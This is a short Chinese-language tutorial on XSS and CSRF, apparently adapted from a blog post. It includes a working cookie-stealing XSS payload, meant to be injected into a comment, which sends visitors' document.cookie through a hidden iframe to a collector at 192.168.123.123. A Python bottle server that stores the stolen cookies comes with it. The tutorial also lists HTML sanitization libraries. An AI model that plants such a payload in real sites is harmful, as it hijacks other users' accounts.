#  XSS 与 CSRF 两种跨站攻击

- XSS：跨站脚本（Cross-site scripting）

- CSRF：跨站请求伪造（Cross-site request forgery）

## XSS

>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，  
例如发布评论，提交含有 JavaScript 的内容文本。  
这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。 

- 也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：
```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

"""
跨站脚本注入的信息收集服务器
"""

import bottle

app = bottle.Bottle()
plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
app.install(plugin)

@app.route('/myxss/')
def show(cookies, db):
    SQL = 'INSERT INTO "myxss" ("cookies") VALUES (?)'
    try:
        db.execute(SQL, cookies)
    except:
        pass
    return ""

if __name__ == "__main__":
    app.run()
```
- 在某一个页面的评论中注入这段代码：

// 用 <script type="text/javascript"></script> 包起来放在评论中
```
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```
于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。

而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。

- 这里附上一些“白名单”消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案
- Python: [lxml.html.clean](http://lxml.de/lxmlhtml.html#cleaning-up-html) / [bleach](https://github.com/jsocol/bleach)
- Ruby: [Sanitize](https://github.com/rgrove/sanitize/)
- JavaScript: [sanitize-html](https://github.com/punkave/sanitize-html)
- PHP: [htmlpurifier](http://htmlpurifier.org/)

## CSRF 冒充用户之手: CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作

>起初一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。
XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。

CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”

## 参考资料
- https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
